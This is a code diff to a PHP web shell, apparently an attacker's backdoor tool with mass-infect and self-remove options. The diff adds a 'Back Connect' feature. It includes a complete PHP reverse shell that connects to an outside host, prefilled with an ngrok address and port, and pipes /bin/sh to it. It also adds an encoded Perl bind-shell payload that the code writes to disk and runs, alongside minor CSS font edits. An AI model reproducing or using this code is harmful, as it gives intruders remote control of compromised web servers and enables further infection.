@@ -81,6 +81,7 @@ if(!function_exists('posix_getegid')) {
 	$uid = @posix_getpwuid(posix_geteuid());
 	$user = $uid['name'];
 }
+$bind_perl="rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";
 
 $self=$_SERVER['PHP_SELF'];
 $server_sofware=$_SERVER['SERVER_SOFTWARE'];
@@ -94,8 +95,8 @@ echo '
 <HEAD>
 <link href="http://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css" />
 <style type="text/css">
-body{
-    font-family:"Orbitron";
+body,textarea{
+    font-family:"Orbitron", cursive;
     background-color:#E7E7E7;
     text-shadow:0px 0px 1px #757575;
 }
@@ -113,8 +114,8 @@ body{
 table{
     border: 1px silver dotted;
 }
-H1{
-    font-family: "Orbitron", cursive;
+H1,h2,pre,font {
+    font-family:"Orbitron", cursive;
 }
 a{
     color:#303030;
@@ -148,6 +149,7 @@ echo "
 <tr><td><a href=\"?adminer\">Adminer</a></td></tr>
 <tr><td><a href=\"?phpinfo\">PHP Info</a></td></tr>
 <tr><td><a href=\"?path={$path}&massinfect\">Mass Infect</a></td></tr>
+<tr><td><a href=\"?rs\">Back Connect</a></td></tr>
 <tr><td><a href=\"?killme\">Self Remove</a></td></tr>
 </table>";
 if(isset($_REQUEST["phpinfo"])) {
@@ -241,6 +243,12 @@ color=red>$ppp$sep$c_file</font></td></tr>";
     <?php
     }
 }
+elseif(isset($_REQUEST['rs'])) {
+    reverse_conn_ui();
+}
+elseif(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port'])) {
+    reverse_conn_bg();
+}
 elseif(isset($_REQUEST['killme'])) {
     global $self;
     $me=basename($self);
@@ -270,6 +278,136 @@ function exe($cmd) {
 		$buff = @shell_exec($cmd); 		
 		return $buff; 	
 	} 
+}
+function reverse_conn_ui() {
+echo "
+<center><h2>Reverse Shell</h2><hr>
+<br><br><form method='GET'>
+<table>
+<tr>
+<td>Your IP : <input name='my_ip' value='0.tcp.ngrok.io'>
+<br>
+PORT : <input name='my_port' value='40141'>
+<input type='submit' value='O'></td></tr>
+<select name='rev_option'>
+<option>PHP Reverse Shell</option>
+<option>PERL Bind Shell</option>
+</select></form>
+<tr><td>
+<font color=red>PHP Reverse Shell</font> : <font> nc -lvp
+<i>port</i></font></td></tr>
+<tr><td><font color=red>PERL Bind Shell</font> : <font> nc
+<i>server_ip port</i></font></td></tr></table>";
+}
+function reverse_conn_bg() {
+    global $os;
+    $option=$_REQUEST['rev_option'];
+    $ip=$_GET['my_ip'];
+    $port=$_GET['my_port'];
+    if($option == "PHP Reverse Shell") {
+        echo "<h2>RESULT</h2><hr><br>";
+        function printit ($string) {
+            if (!$daemon) {
+		print "$string\n";
+            }
+        }
+        $chunk_size = 1400;
+        $write_a = null;
+        $error_a = null;
+        $shell = 'uname -a; w; id; /bin/sh -i';
+        $daemon = 0;
+        $debug = 0;
+        if (function_exists('pcntl_fork')) {
+            $pid = pcntl_fork();
+            if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+            }
+            if ($pid) {
+		exit(0);
+            }
+            if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+            }
+            $daemon = 1;
+        }else {
+            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+        }
+        chdir("/");
+        umask(0);
+        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
+        if (!$sock) {
+            printit("$errstr ($errno)");
+            exit(1);
+        }
+        $descriptorspec = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
+        $process = proc_open($shell, $descriptorspec, $pipes);
+        if (!is_resource($process)) {
+            printit("ERROR: Can't spawn shell");
+            exit(1);
+        }
+        stream_set_blocking($pipes[0], 0);
+        stream_set_blocking($pipes[1], 0);
+        stream_set_blocking($pipes[2], 0);
+        stream_set_blocking($sock, 0);
+        printit("<font>Successfully opened reverse shell to $ip:$port </font>");
+        while (1)
+        {
+            if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+            }
+            if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+            }
+            $read_a = array($sock, $pipes[1], $pipes[2]);
+            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+            if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+            }
+            if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+            }
+            if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+            }
+        }
+        fclose($sock);
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+        echo "<br><br><hr><br><br></div>";
+    }
+    else if($option == "PERL Bind Shell") {
+        global $bind_perl, $os;
+        $pbfl=$bind_perl;
+        $handlr=fopen("back.pl", "wb");
+        if($handlr) {
+            fwrite($handlr, gzinflate(base64_decode($bind_perl)));
+        }else {
+        echo "<script>alert('Access Denied for create new file');</script>";
+        }
+        fclose($handlr);
+        if(file_exists("back.pl")) {
+            if($os == "nix") {
+                exe("chmod +x back.pl;perl back.pl $port");
+            }else {
+                exe("perl back.pl $port");
+            }
+        }
+    }
 }
 echo '
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
